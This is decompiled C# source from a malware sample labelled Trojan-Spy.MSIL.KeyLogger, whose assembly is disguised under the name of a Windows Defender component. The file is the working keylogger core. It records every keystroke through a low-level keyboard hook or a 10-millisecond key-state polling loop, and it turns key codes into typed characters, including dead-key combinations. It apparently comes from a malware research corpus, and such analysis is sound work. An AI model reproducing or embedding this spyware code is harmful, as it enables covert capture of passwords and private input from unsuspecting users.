// Decompiled with JetBrains decompiler
// Type: Keylogger.Keylogger
// Assembly: MSASCui, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 0EB0363B-A145-4FB4-99F4-D9A059C20475
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00001-msil\Trojan-Spy.MSIL.KeyLogger.cciq-bfc0cb7ef8fe04011213597be5b7a2bcbaee7399e7490b3766024e20624b83f3.exe

using System;
using System.Collections;
using System.ComponentModel;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

namespace Keylogger
{
  internal class Keylogger : Component
  {
    private const int WM_KEYDOWN = 256;
    private const int WM_SYSKEYDOWN = 260;
    private const int WM_KEYUP = 257;
    private const int WM_SYSKEYUP = 261;
    private Keylogger.Keylogger.KLG klg;
    private Keylogger.Keylogger.Keylogger_Modes _Mode;
    private bool _Enabled = true;
    private bool lastWasDeadKey;
    private bool DeadKeyOver;
    private ArrayList DeadKeys = new ArrayList();

    [DllImport("user32.dll")]
    private static extern uint MapVirtualKey(uint uCode, uint uMapType);

    [DllImport("user32.dll")]
    private static extern IntPtr GetKeyboardLayout(uint idThread);

    [DllImport("user32.dll")]
    private static extern int ToAscii(
      uint uVirtKey,
      uint uScanCode,
      byte[] lpKeyState,
      [Out] StringBuilder lpChar,
      uint uFlags);

    [Description("")]
    public event Keylogger.Keylogger.ValueChangedEventHandler VKCodeAsStringDown;

    [Description("")]
    public event Keylogger.Keylogger.ValueChangedEventHandler VKCodeAsStringUp;

    [Description("")]
    public event Keylogger.Keylogger.ValueChangedEventHandler2 VKCodeDown;

    [Description("")]
    public event Keylogger.Keylogger.ValueChangedEventHandler2 VKCodeUp;

    [Description("")]
    public Keylogger.Keylogger.Keylogger_Modes Keylogger_Mode
    {
      get => this._Mode;
      set
      {
        if (value >= Keylogger.Keylogger.Keylogger_Modes.Hooks)
        {
          this._Mode = value;
          if (this.klg != null)
          {
            this.klg.Dispose();
            this.klg = (Keylogger.Keylogger.KLG) null;
          }
          if (!this._Enabled)
            return;
          switch (this._Mode)
          {
            case Keylogger.Keylogger.Keylogger_Modes.Hooks:
              this.klg = (Keylogger.Keylogger.KLG) new Keylogger.Keylogger.KLG_Hooks(this);
              break;
            case Keylogger.Keylogger.Keylogger_Modes.Polling:
              this.klg = (Keylogger.Keylogger.KLG) new Keylogger.Keylogger.KLG_Polling(this);
              break;
          }
        }
        else
          this._Mode = Keylogger.Keylogger.Keylogger_Modes.Hooks;
      }
    }

    [Description("")]
    public bool Enabled
    {
      get => this._Enabled;
      set
      {
        this._Enabled = value;
        this.Keylogger_Mode = this._Mode;
      }
    }

    private static bool IsDeadKey(uint vkCode) => ((int) Keylogger.Keylogger.MapVirtualKey(vkCode, 2U) & int.MinValue) != 0;

    private bool IsPrintableKey(uint vkCode) => vkCode >= 32U;

    private bool isChar(string s) => s.ToString().Length == 1;

    private bool isCTRLPressed() => Control.ModifierKeys == Keys.Control;

    [DllImport("user32.dll")]
    private static extern short GetKeyState(int nVirtKey);

    private byte[] myGetKeyboardState()
    {
      byte[] keyboardState = new byte[256];
      for (int nVirtKey = 0; nVirtKey < keyboardState.Length; ++nVirtKey)
        keyboardState[nVirtKey] = (byte) Keylogger.Keylogger.GetKeyState(nVirtKey);
      return keyboardState;
    }

    private void OnKeyActionFurtherProcessing2(
      uint vkcode,
      uint nScanCode,
      bool isDown,
      byte[] KBSTATE)
    {
      string s = ((Keys) vkcode).ToString();
      if (this.IsPrintableKey(vkcode) && !this.isCTRLPressed())
      {
        StringBuilder lpChar = new StringBuilder(2);
        uint ascii = (uint) Keylogger.Keylogger.ToAscii(vkcode, nScanCode, KBSTATE, lpChar, 0U);
        this.DeadKeyOver = false;
        if (ascii > 0U)
          s = lpChar.ToString().Substring(0, 1);
      }
      if (isDown)
        this.VKCodeAsStringDown(s, this.isChar(s));
      else
        this.VKCodeAsStringUp(s, this.isChar(s));
    }

    private void OnKeyActionFurtherProcessing1(uint vkcode, uint nScanCode, bool isDown)
    {
      if (Keylogger.Keylogger.IsDeadKey(vkcode))
      {
        this.lastWasDeadKey = true;
        byte[] numArray = new byte[256];
        byte[] keyboardState = this.myGetKeyboardState();
        this.DeadKeys.Add((object) new object[4]
        {
          (object) vkcode,
          (object) nScanCode,
          (object) isDown,
          (object) keyboardState
        });
      }
      else if (this.lastWasDeadKey)
      {
        byte[] numArray = new byte[256];
        byte[] keyboardState = this.myGetKeyboardState();
        this.DeadKeyOver = true;
        this.lastWasDeadKey = false;
        this.DeadKeys.Add((object) new object[4]
        {
          (object) vkcode,
          (object) nScanCode,
          (object) isDown,
          (object) keyboardState
        });
      }
      else
      {
        if (this.DeadKeyOver)
        {
          foreach (object[] deadKey in this.DeadKeys)
          {
            this.OnKeyActionFurtherProcessing2((uint) deadKey[0], (uint) deadKey[1], (bool) deadKey[2], (byte[]) deadKey[3]);
            if (Keylogger.Keylogger.IsDeadKey((uint) deadKey[0]))
              Keylogger.Keylogger.ToAscii(vkcode, nScanCode, (byte[]) deadKey[3], new StringBuilder(2), 0U);
          }
          this.DeadKeys.Clear();
        }
        byte[] numArray = new byte[256];
        byte[] keyboardState = this.myGetKeyboardState();
        this.OnKeyActionFurtherProcessing2(vkcode, nScanCode, isDown, keyboardState);
      }
    }

    private void OnKeyAction(int vkcode, int scancode, bool isDown)
    {
      if (this.VKCodeAsStringDown != null && isDown)
        this.OnKeyActionFurtherProcessing1((uint) vkcode, (uint) scancode, true);
      else if (this.VKCodeAsStringUp != null && !isDown)
        this.OnKeyActionFurtherProcessing1((uint) vkcode, (uint) scancode, false);
      if (this.VKCodeDown != null && isDown)
      {
        this.VKCodeDown(vkcode);
      }
      else
      {
        if (this.VKCodeUp == null || isDown)
          return;
        this.VKCodeUp(vkcode);
      }
    }

    public delegate void ValueChangedEventHandler(string value, bool isChar);

    public delegate void ValueChangedEventHandler2(int vkcode);

    public enum Keylogger_Modes
    {
      Hooks,
      Polling,
    }

    private abstract class KLG : IDisposable
    {
      public static Keylogger.Keylogger klg;

      public abstract void Dispose();
    }

    private class KLG_Hooks : Keylogger.Keylogger.KLG
    {
      private const int WH_KEYBOARD_LL = 13;
      private const int WM_KEYDOWN = 256;
      private const int WM_SYSKEYDOWN = 260;
      private const int WM_KEYUP = 257;
      private const int WM_SYSKEYUP = 261;
      private static Keylogger.Keylogger.KLG_Hooks.LowLevelKeyboardProc _proc = new Keylogger.Keylogger.KLG_Hooks.LowLevelKeyboardProc(Keylogger.Keylogger.KLG_Hooks.HookCallback);
      private static IntPtr _hookID = IntPtr.Zero;

      [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
      private static extern IntPtr SetWindowsHookEx(
        int idHook,
        Keylogger.Keylogger.KLG_Hooks.LowLevelKeyboardProc lpfn,
        IntPtr hMod,
        uint dwThreadId);

      [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
      [return: MarshalAs(UnmanagedType.Bool)]
      private static extern bool UnhookWindowsHookEx(IntPtr hhk);

      [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
      private static extern IntPtr CallNextHookEx(
        IntPtr hhk,
        int nCode,
        IntPtr wParam,
        ref Keylogger.Keylogger.KLG_Hooks.KBDLLHOOKSTRUCT lParam);

      [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
      private static extern IntPtr GetModuleHandle(string lpModuleName);

      public KLG_Hooks(Keylogger.Keylogger _klg)
      {
        Keylogger.Keylogger.KLG_Hooks._hookID = Keylogger.Keylogger.KLG_Hooks.SetHook(Keylogger.Keylogger.KLG_Hooks._proc);
        Keylogger.Keylogger.KLG.klg = _klg;
      }

      public override void Dispose()
      {
        this.Dispose(true);
        GC.SuppressFinalize((object) this);
      }

      protected virtual void Dispose(bool disposing)
      {
        int num = disposing ? 1 : 0;
        Keylogger.Keylogger.KLG_Hooks.UnhookWindowsHookEx(Keylogger.Keylogger.KLG_Hooks._hookID);
      }

      ~KLG_Hooks() => this.Dispose(false);

      [DllImport("kernel32.dll")]
      public static extern int GetCurrentThreadId();

      private static IntPtr SetHook(Keylogger.Keylogger.KLG_Hooks.LowLevelKeyboardProc proc)
      {
        using (Process currentProcess = Process.GetCurrentProcess())
        {
          using (ProcessModule mainModule = currentProcess.MainModule)
            return Keylogger.Keylogger.KLG_Hooks.SetWindowsHookEx(13, proc, Keylogger.Keylogger.KLG_Hooks.GetModuleHandle(mainModule.ModuleName), 0U);
        }
      }

      private static IntPtr HookCallback(
        int nCode,
        IntPtr wParam,
        ref Keylogger.Keylogger.KLG_Hooks.KBDLLHOOKSTRUCT lParam)
      {
        if (nCode >= 0)
        {
          if (wParam == (IntPtr) 256 || wParam == (IntPtr) 260)
            Keylogger.Keylogger.KLG.klg.OnKeyAction(lParam.vkCode, lParam.scanCode, true);
          else if (wParam == (IntPtr) 257 || wParam == (IntPtr) 261)
            Keylogger.Keylogger.KLG.klg.OnKeyAction(lParam.vkCode, lParam.scanCode, false);
        }
        return Keylogger.Keylogger.KLG_Hooks.CallNextHookEx(Keylogger.Keylogger.KLG_Hooks._hookID, nCode, wParam, ref lParam);
      }

      public delegate void KeyUpCallback(string x);

      private delegate IntPtr LowLevelKeyboardProc(
        int nCode,
        IntPtr wParam,
        ref Keylogger.Keylogger.KLG_Hooks.KBDLLHOOKSTRUCT lParam);

      private struct KBDLLHOOKSTRUCT
      {
        public int vkCode;
        public int scanCode;
        public int flags;
        private int time;
        private int dwExtraInfo;
      }
    }

    private class KLG_Polling : Keylogger.Keylogger.KLG
    {
      private Timer timerKeyMine;
      private bool[] a = new bool[256];
      private int KEY_PRESSED = 32768;

      [DllImport("User32.dll")]
      private static extern short GetAsyncKeyState(int vKey);

      [DllImport("user32.dll")]
      private static extern uint MapVirtualKeyEx(uint uCode, uint uMapType, IntPtr dwhkl);

      [DllImport("user32.dll")]
      private static extern IntPtr GetKeyboardLayout(uint idThread);

      [DllImport("user32.dll")]
      private static extern short GetKeyState(int nVirtKey);

      public KLG_Polling(Keylogger.Keylogger _klg)
      {
        for (int index = 0; index < this.a.Length; ++index)
          this.a[index] = false;
        Keylogger.Keylogger.KLG.klg = _klg;
        this.timerKeyMine = new Timer();
        this.timerKeyMine.Interval = 10;
        this.timerKeyMine.Tick += new EventHandler(this.timerKeyMine_Tick);
        this.timerKeyMine.Enabled = true;
      }

      private void timerKeyMine_Tick(object sender, EventArgs e)
      {
        for (int index = 8; index < 256; ++index)
        {
          bool isDown = Keylogger.Keylogger.KLG_Polling.GetAsyncKeyState(index) == (short) -32767;
          if (isDown || this.a[index] && !Convert.ToBoolean((int) Keylogger.Keylogger.KLG_Polling.GetKeyState(index) & this.KEY_PRESSED))
          {
            IntPtr keyboardLayout = Keylogger.Keylogger.KLG_Polling.GetKeyboardLayout(0U);
            uint scancode = Keylogger.Keylogger.KLG_Polling.MapVirtualKeyEx((uint) index, 0U, keyboardLayout);
            Keylogger.Keylogger.KLG.klg.OnKeyAction(index, (int) scancode, isDown);
            this.a[index] = isDown;
          }
        }
      }

      public override void Dispose()
      {
        this.Dispose(true);
        GC.SuppressFinalize((object) this);
      }

      protected virtual void Dispose(bool disposing)
      {
        int num = disposing ? 1 : 0;
        this.timerKeyMine.Dispose();
      }

      ~KLG_Polling() => this.Dispose(false);
    }
  }
}
